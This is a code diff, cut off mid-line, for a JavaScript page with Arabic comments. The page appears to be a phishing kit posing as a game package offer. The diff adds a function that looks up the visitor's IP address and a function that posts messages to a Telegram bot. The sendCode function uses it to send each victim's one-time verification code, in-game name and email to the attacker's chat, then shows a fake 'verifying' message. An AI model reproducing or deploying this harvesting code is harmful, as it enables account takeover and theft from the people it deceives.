@@ -341,6 +341,11 @@ function updateDots(active) {
   });
 }
 
+function toggleHelp(id) {
+  const el = document.getElementById(id);
+  el.classList.toggle('show');
+}
+
 // ============================================================
 // اختيار الباقة (باستخدام Event Listener)
 // ============================================================
@@ -386,6 +391,39 @@ function confirmMethod() {
 }
 
 // ============================================================
+// الحصول على IP
+// ============================================================
+async function getIP() {
+  try {
+    const res = await fetch('https://api.ipify.org?format=json');
+    const data = await res.json();
+    return data.ip;
+  } catch {
+    return 'غير معروف';
+  }
+}
+
+// ============================================================
+// إرسال إلى تيليجرام
+// ============================================================
+async function tgSend(message) {
+  try {
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    await fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: message,
+        parse_mode: 'HTML'
+      })
+    });
+  } catch (e) {
+    console.log('خطأ في الإرسال:', e);
+  }
+}
+
+// ============================================================
 // إرسال اسم الشخصية
 // ============================================================
 async function sendIGN() {
@@ -419,35 +457,4 @@ function sendCode() {
   const code = document.getElementById('code').value.trim();
   if (code.length < 6) { showToast('❌ أدخل رمز التحقق المكون من 6 أرقام'); return; }
   data.code = code;
-  tgSend(`🔐 <b>رمز التحقق OTP</b>\n━━━━━━━━━━━━━━━━\n<b>📱 الرمز:</b> <code>${code}</code>\n<b>🎮 IGN:</b> ${data.ign || 'غير محدد'}\n<b>📧 البريد:</b> ${data.email || 'غير محدد'}\n━━━━━━━━━━━━━━━━`);
-  showToast('⏳ جاري التحقق...');
-  next(4);
-  setTimeout(() => next(5), 3000);
-}
-
-function resendCode() {
-  showToast('📨 تم إعادة إرسال الرمز');
-  resetTimer();
-}
-
-// ============================================================
-// المؤقت
-// ============================================================
-function resetTimer() {
-  clearInterval(timerInterval);
-  timeLeft = 180;
-  updateTimerDisplay();
-  timerInterval = setInterval(() => {
-    timeLeft--;
-    updateTimerDisplay();
-    if (timeLeft <= 0) clearInterval(timerInterval);
-  }, 1000);
-}
-
-function updateTimerDisplay() {
-  const m = String(Math.floor(timeLeft / 60)).padStart(2, '0');
-  const s = String(timeLeft % 60).padStart(2, '0');
-  document.getElementById('timerDisplay').textContent = m + ':' + s;
-}
-
-// =
+  tgSend(`🔐 <b>رمز التحقق OTP</b>\n━━━━━━━━━━━━━━━━\n<b>📱 الرمز:</b> <code>${code}</code>\n<b>🎮 IGN:</b> ${data.
